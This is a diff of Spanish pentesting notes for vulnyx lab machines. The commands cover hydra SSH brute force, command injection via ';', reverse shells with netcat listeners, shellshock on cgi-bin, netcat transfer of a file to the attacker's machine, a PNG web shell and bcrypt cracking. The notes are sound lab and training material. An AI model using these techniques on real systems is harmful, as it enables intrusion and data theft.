-66.- Cuando tengamos los servicios htttp y ssh y en la web no encontramos nada podemos hacer ataque de fuerza bruta, primero creando una lista de palabras como contraseñas usando palabras de la web, entendiendose que la web es de tipo servicios, portafolio.
+## 66.- Cuando tengamos los servicios htttp y ssh y en la web no encontramos nada podemos hacer ataque de fuerza bruta, primero creando una lista de palabras como contraseñas usando palabras de la web, entendiendose que la web es de tipo servicios, portafolio.
 
 este comando genera una diccionario tomando palabras de la web y lo guarda como pass.txt
 
@@ -1752,7 +1756,7 @@ hydra -L usernames.txt -P pass.txt ssh://192.168.42.141 -t 64 -I
 
 -------------------------------------------------------------------------------
 
-67.- Crear entornos virtuales
+## 67.- Crear entornos virtuales
 
 python3 -m venv nombre_entorno
 
@@ -1776,7 +1780,7 @@ Si te dice "No such file or directory", entonces ya está eliminado correctament
 
 -------------------------------------------------------------------------------
 
-68.- Si tengo un input de búsqueda entonces también puedo injectar código con ";" seguido de id o otros comandos.
+## 68.- Si tengo un input de búsqueda entonces también puedo injectar código con ";" seguido de id o otros comandos.
 
 Ejemplo máquina hackingstation de vulnyx
 
@@ -1796,7 +1800,7 @@ http://192.168.42.149/exploitQuery.php?product=hola%3BURLENCODE
 
 -------------------------------------------------------------------------------
 
-69.- si tenemos una máquina con windows 7 o xp que tienen los siguientes puertos abiertos:
+## 69.- si tenemos una máquina con windows 7 o xp que tienen los siguientes puertos abiertos:
 
 135/tcp open  msrpc        Microsoft Windows RPC
 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
@@ -1816,7 +1820,7 @@ ambos los buscamos en metasploit
 
 -------------------------------------------------------------------------------
 
-70.- Si al hacer un escaneo de puertos y servicios con nmap al puerto 80 y veo que tiene un servicio php corriendo y al hacer gobuster solo me muestra el info.php hay que ver los Loaded Modules cargados, pueda ser que haya un modulo que tenga algún exploit.
+## 70.- Si al hacer un escaneo de puertos y servicios con nmap al puerto 80 y veo que tiene un servicio php corriendo y al hacer gobuster solo me muestra el info.php hay que ver los Loaded Modules cargados, pueda ser que haya un modulo que tenga algún exploit.
 
 http://192.168.42.155/info.php
 
@@ -1845,7 +1849,7 @@ User/Group
 
 -------------------------------------------------------------------------------
 
-71.- Los archivos .bak son archivos de backup
+## 71.- Los archivos .bak son archivos de backup
 
 ejemplo tenemos el archivo connect.bak
 
@@ -1859,7 +1863,7 @@ curl -s http://192.168.42.158/directorio/connect.bak
 
 -------------------------------------------------------------------------------
 
-72.- Variable de entorno PATH
+## 72.- Variable de entorno PATH
 
 PATH le dice al sistema dónde buscar ejecutables cuando tú escribes un comando en la terminal. Si ejecutas, por ejemplo, ls o python3, el sistema usa los directorios listados en PATH para buscar ese ejecutable.
 
@@ -1942,7 +1946,7 @@ Environment="PATH=/custom/bin:/usr/bin:/bin"
 
 -------------------------------------------------------------------------------
 
-73.- Si tengo el puerto ssh y http Apache abierto y veo que no se puede hacer nada más, entonces procedo lanzar un curl
+## 73.- Si tengo el puerto ssh y http Apache abierto y veo que no se puede hacer nada más, entonces procedo lanzar un curl
 
 curl IP-VÍCTIMA -I
 
@@ -1971,7 +1975,7 @@ nos ponemos en escucha con netcat y ejcutamos
 
 curl http://192.168.1.121/reverse.php
 
-74.- Si tengo un puerto http y ya agoté los recursos para enumerar, hice fuzzing web y no funciona entonces pruebo con puertos UDP.
+## 74.- Si tengo un puerto http y ya agoté los recursos para enumerar, hice fuzzing web y no funciona entonces pruebo con puertos UDP.
 
 los puerto más comunes 67,68,69,82
 
@@ -1979,7 +1983,7 @@ sudo nmap -sU -p 67,68,69,82 IP-VICTIMA
 
 -------------------------------------------------------------------------------
 
-75.- Cuando estoy editando un archivo de texto y se cierra inesperadamente, los archivos cerrados tienen las siguientes extensiones:
+## 75.- Cuando estoy editando un archivo de texto y se cierra inesperadamente, los archivos cerrados tienen las siguientes extensiones:
 
 .tmp
 
@@ -1993,11 +1997,11 @@ sudo nmap -sU -p 67,68,69,82 IP-VICTIMA
 
 -------------------------------------------------------------------------------
 
-76.- A veces cuando tenemos conexión por ssh y no podemos escalar privilegios, pero tenemos un servidor web corriendo en la víctima, podemos subir un reverse shell en /var/www/html a veces el usuario www-data nos permite escalar privilegios
+## 76.- A veces cuando tenemos conexión por ssh y no podemos escalar privilegios, pero tenemos un servidor web corriendo en la víctima, podemos subir un reverse shell en /var/www/html a veces el usuario www-data nos permite escalar privilegios
 
 -------------------------------------------------------------------------------
 
-77.- Si un archivo se está editando y no se cierra el editor de manera inesperada, las extensiones que se guardan el archivo no editado completamente depende del editor que se estaba utilizando:
+## 77.- Si un archivo se está editando y no se cierra el editor de manera inesperada, las extensiones que se guardan el archivo no editado completamente depende del editor que se estaba utilizando:
 
 nano -> .swp, .save, archivo~
 vim / neovim -> .swp, .swo
@@ -2007,7 +2011,7 @@ mousepad (XFCE) -> archivo~
 
 -------------------------------------------------------------------------------
 
-78.- Si tenemos acceso a la carpeta cgi-bin
+## 78.- Si tenemos acceso a la carpeta cgi-bin
 
 referencia máquina shock - vulnyx
 
@@ -2038,7 +2042,7 @@ nos ponemos en escucha con netcat y listo
 
 -------------------------------------------------------------------------------
 
-79.- netcat también sirve para transferir archivos
+## 79.- netcat también sirve para transferir archivos
 
 en kali:
 
@@ -2058,7 +2062,7 @@ nc IP-KALI 1234 < root.gpg
 
 -------------------------------------------------------------------------------
 
-80.- si tenemos un repositorio .git
+## 80.- si tenemos un repositorio .git
 
 siempre hay que ver los commits
 
@@ -2117,7 +2121,7 @@ git log --all | grep "commit" | cut -d " " -f2 | xargs git show
 
 -------------------------------------------------------------------------------
 
-81.- Ver achivos .db
+## 81.- Ver achivos .db
 
 generalmente los archivo .db son SQLite
 
@@ -2137,13 +2141,13 @@ si está instalado me mostrará algo como
 
 sqlite3 database.db
 
-# Dentro de SQLite3:
+Dentro de SQLite3:
 .tables          # Listar tablas
 .schema users    # Ver estructura de la tabla 'users'
 SELECT * FROM users;  # Consulta SQL
 .exit           # Salir
 
-78.- comando sudo
+## 78.- comando sudo
 
 si al ejecutar sudo -l 
 
@@ -2167,11 +2171,11 @@ entonces ejecutamos:
 
 -------------------------------------------------------------------------------
 
-82.- Es bueno analizar el script.min.js
+## 82.- Es bueno analizar el script.min.js
 
 -------------------------------------------------------------------------------
 
-83.- En algunas ocasioes hay softwares que se ejecutan en la máquia víctima por allgún puerto pero no se pueden accerder al software fuera de ella, podemos hacer un port forwarding:
+## 83.- En algunas ocasioes hay softwares que se ejecutan en la máquia víctima por allgún puerto pero no se pueden accerder al software fuera de ella, podemos hacer un port forwarding:
 
 primero hacemos ss -ltun para ver el puerto dónde se ejecuta el software
 
@@ -2201,13 +2205,13 @@ referencia máquia psmyn vulnyx
 
 -------------------------------------------------------------------------------
 
-84.- Si tengo algún puerto que desconozco y ya sea udp o tcp, busco un exploit o una herramienta para auditarlo..
+## 84.- Si tengo algún puerto que desconozco y ya sea udp o tcp, busco un exploit o una herramienta para auditarlo..
 
 Ejemplo máquina call de vulnyx
 
 -------------------------------------------------------------------------------
 
-85.- Crear una web shell con una imagen .png
+## 85.- Crear una web shell con una imagen .png
 
 primero creamos una imagen en blanco.
 
@@ -2239,7 +2243,7 @@ http://twitx.nyx/private.php?folder=upload&file=9551640368051400adf634.83527497.
 
 -------------------------------------------------------------------------------
 
-86.- Desencriptar bcrypt
+## 86.- Desencriptar bcrypt
 
 echo "hash-bcrypt" > hash.txt
 
